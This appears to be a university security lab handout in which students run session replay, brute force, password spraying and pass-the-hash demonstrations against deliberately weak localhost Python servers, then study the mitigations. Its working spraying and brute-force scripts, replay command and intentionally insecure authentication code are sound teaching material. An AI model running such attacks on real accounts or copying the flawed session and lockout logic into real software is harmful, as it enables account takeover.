# Lab 15: Session Replay, Password Attacks, and Pass the Hash

## Objectives

By the end of this lab, you will be able to:

1. Capture a session ID and replay the session from another terminal, impersonating the user.
2. Show how per-account lockout stops a brute force attack and fails to stop a spraying attack.
3. Explain the pass the hash mechanism by demonstrating that a server comparing hashes accepts the hash alone.

## Prerequisites

- SSH access to your assigned course VM (Linux). No administrator rights are required.
- Python 3 with the standard library only.
- Chapter 8 notes, Section 8: replay attacks, session replay, and pass the hash. Chapter 8 notes, Section 10: brute force and spraying.

## Before you start

### Background

A replay attack repeats an intercepted transmission, and a session replay attack reuses a captured session ID. Replay works because the receiver treats identical messages at different times as equally valid. Password attacks split into brute force, which tries every combination against one account, and spraying, which tries one common password against many accounts. Pass the hash skips the password entirely when a server treats the password hash as sufficient proof.

| Concept from the lecture | Where you observe the concept in this lab |
| --- | --- |
| Session ID identifies an authenticated user | Part 1: the `SID` cookie drives `/whoami` |
| Session replay | Part 2: a second terminal becomes alice with the captured ID |
| Brute force and account lockout | Part 3: the attack stops after a handful of attempts |
| Spraying evades per-account lockout | Part 4: one password opens five accounts |
| Pass the hash against static hashes | Part 5: the hash alone authenticates |

### Set-up and Implementation

- On the VM, create a folder for this lab in the class folder in the home directory.
  - create folder: `mkdir -p ~/comp301/lab15`
  - go to folder: `cd ~/comp301/lab15`

## Part 1: A session cookie

Write the session application:

```bash
cat > session.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 15 session demo. /login issues a session id cookie. /whoami trusts
whatever session id arrives, which makes session replay possible."""
import secrets
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

SESSIONS = {}
USERS = {"alice": "wonderland1", "bob": "builder2"}


class H(BaseHTTPRequestHandler):
    def _send(self, body, code=200, cookie=None):
        data = body.encode()
        self.send_response(code)
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/login":
            name = q.get("u", [""])[0]
            pw = q.get("p", [""])[0]
            if USERS.get(name) != pw:
                self._send("denied\n", 403)
                return
            sid = secrets.token_hex(8)
            SESSIONS[sid] = name
            self._send(f"welcome {name}\n", cookie=f"SID={sid}; HttpOnly")
        elif u.path == "/whoami":
            raw = self.headers.get("Cookie", "")
            user = None
            for part in raw.split(";"):
                k, _, v = part.strip().partition("=")
                if k == "SID":
                    user = SESSIONS.get(v)
            self._send(f"you are {user}\n" if user else "anonymous\n")
        else:
            self.send_error(404)

    def log_message(self, *a):
        pass


print("Listening on http://127.0.0.1:8400")
HTTPServer(("127.0.0.1", 8400), H).serve_forever()
PYEOF

python3 session.py
```

Work from a second SSH session. Log in and check identity with and without the cookie:

```bash
curl -s -c jar.txt 'http://127.0.0.1:8400/login?u=alice&p=wonderland1'
curl -s http://127.0.0.1:8400/whoami
curl -s -b jar.txt http://127.0.0.1:8400/whoami
```

Without the cookie the server answers `anonymous`. With the cookie the server answers `you are alice`.

## Part 2: Session replay

Read the session ID from the jar:

```bash
grep SID jar.txt
```

Open a third SSH session, which plays the role of the attacker's machine, and replay the ID without knowing alice's password:

```bash
SID=$(grep SID ~/comp301/lab15/jar.txt | awk '{print $NF}')
curl -s -H "Cookie: SID=$SID" http://127.0.0.1:8400/whoami
```

The attacker is alice. The server cannot tell a replayed ID from the original, because the ID alone proves the session. The notes give the defense family: timestamps and sequence numbers let a receiver discard repeated material, and session expiry plus ID regeneration shrink the window. Record the replayed response.

## Part 3: Brute force meets lockout

Write the authentication service and the two attack scripts:

```bash
cat > auth.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 15 auth demo. Locks an account after 5 failed logins on that account,
but places no limit per source address."""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

USERS = {}
for n in range(50):
    name = f"user{n:02d}"
    USERS[name] = "Password1" if n % 10 == 0 else f"Sup3r-{n:02d}-long"

FAILED = {}
LOCK_AFTER = 5


class H(BaseHTTPRequestHandler):
    def _send(self, body, code=200):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path != "/login":
            self.send_error(404)
            return
        q = parse_qs(u.query)
        name = q.get("u", [""])[0]
        pw = q.get("p", [""])[0]
        if FAILED.get(name, 0) >= LOCK_AFTER:
            self._send("locked\n", 403)
            return
        if USERS.get(name) == pw:
            self._send("welcome\n")
        else:
            FAILED[name] = FAILED.get(name, 0) + 1
            self._send("denied\n", 403)

    def log_message(self, *a):
        pass


print("Listening on http://127.0.0.1:8401")
HTTPServer(("127.0.0.1", 8401), H).serve_forever()
PYEOF

cat > brute.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 15 brute force: many passwords against one account."""
import itertools
import string
import urllib.request
import urllib.error

TARGET = "user01"
tried = 0
for pair in itertools.product(string.ascii_lowercase, repeat=2):
    pw = "".join(pair)
    tried += 1
    url = f"http://127.0.0.1:8401/login?u={TARGET}&p={pw}"
    try:
        r = urllib.request.urlopen(url).read().decode().strip()
    except urllib.error.HTTPError as e:
        r = e.read().decode().strip()
    if r == "locked":
        print(f"account locked after {tried} attempts, attack stopped")
        break
    if r == "welcome":
        print(f"cracked {TARGET} with {pw} after {tried} attempts")
        break
PYEOF

cat > spray.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 15 spraying: one common password against every account."""
import urllib.request
import urllib.error

PASSWORD = "Password1"
hits = []
for n in range(50):
    name = f"user{n:02d}"
    url = f"http://127.0.0.1:8401/login?u={name}&p={PASSWORD}"
    try:
        r = urllib.request.urlopen(url).read().decode().strip()
    except urllib.error.HTTPError as e:
        r = e.read().decode().strip()
    if r == "welcome":
        hits.append(name)
print(f"{len(hits)} accounts opened with {PASSWORD}: {', '.join(hits)}")
PYEOF
```

Stop the session server in terminal 1 with `Ctrl+C` and start the auth service:

```bash
python3 auth.py
```

Run the brute force attack:

```bash
python3 brute.py
```

The lockout fires after five failures on user01, and the attack stops at the sixth request without cracking anything. Record the output line.

## Part 4: Spraying slips past lockout

Run the spraying attack against the same service:

```bash
python3 spray.py
```

One password, `Password1`, opens five of the fifty accounts: user00, user10, user20, user30, and user40. Each account saw a single attempt, far below the lockout threshold of five. Spraying trades depth for breadth, which is why defenses also need per-source throttling and detection across accounts. Record the output line.

## Part 5: Pass the hash

Stop the auth server and run the concept demo:

```bash
cat > pth.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 15 pass the hash concept. The server compares hashes, so possession of
the hash alone is enough, and the cleartext password is never needed."""
import hashlib

STORED = hashlib.sha256(b"wonderland1").hexdigest()


def login(password=None, presented_hash=None):
    if presented_hash is not None:
        return presented_hash == STORED
    return hashlib.sha256(password.encode()).hexdigest() == STORED


print("real password accepted:", login(password="wonderland1"))
print("wrong password accepted:", login(password="wrongpass"))
print("stolen hash accepted:", login(presented_hash=STORED))
print()
print("stored hash:", STORED)
PYEOF

python3 pth.py
```

The output reads True, False, True. The stolen hash authenticates because the server compares hashes, and the attacker never needed the cleartext password. NTLM behaves this way, and the NTLM hash stays static until the user changes the password, which is why the notes list the mitigations: multi-factor authentication, Kerberos instead of NTLM, restricted administrative privileges, network segmentation, Credential Guard, and monitoring for unusual authentication.

## Part 6: Analysis

Answer in one sentence each, from what you observed:

1. What does the server know about the client holding the replayed session ID?
2. Why did spraying succeed against a service that stops brute force?
3. Which mitigation from the notes would still protect alice after the attacker captures the hash?

## Assignment

Create a `submission.txt` file with the following entries:

- `whoami-anonymous: <response without the cookie>`
- `whoami-replay: <response with the replayed SID>`
- `brute-result: <the output line from brute.py>`
- `spray-result: <the output line from spray.py>`
- `spray-accounts: <the list of opened accounts>`
- `pth-line-3: <the third output line from pth.py>`
- `analysis-1: <one sentence>`
- `analysis-2: <one sentence>`
- `analysis-3: <one sentence>`

## Submission

- Place `submission.txt` in this lab folder (`~/comp301/lab15`) and name the file exactly `submission.txt`.

## Useful References and Resources

- CWE-294, "Authentication Bypass by Capture-replay," and CWE-307, "Improper Restriction of Excessive Authentication Attempts."
- CWE-798, "Use of Hard-coded Credentials," covering the default credential risk from the notes.
- Microsoft Learn, "Microsoft Defender Credential Guard": credential isolation against pass the hash.
- OWASP, "Authentication Cheat Sheet": throttling, lockout, and MFA guidance.
- Chapter 8 notes, Section 8 and Section 10.

## Optional Challenges

- Add per-source throttling to `auth.py` by tracking failures per client address, rerun `spray.py`, and record the change in the hit count.
- Add a timestamp to the session ID in `session.py`, reject IDs older than 60 seconds, and describe which replay window remains.
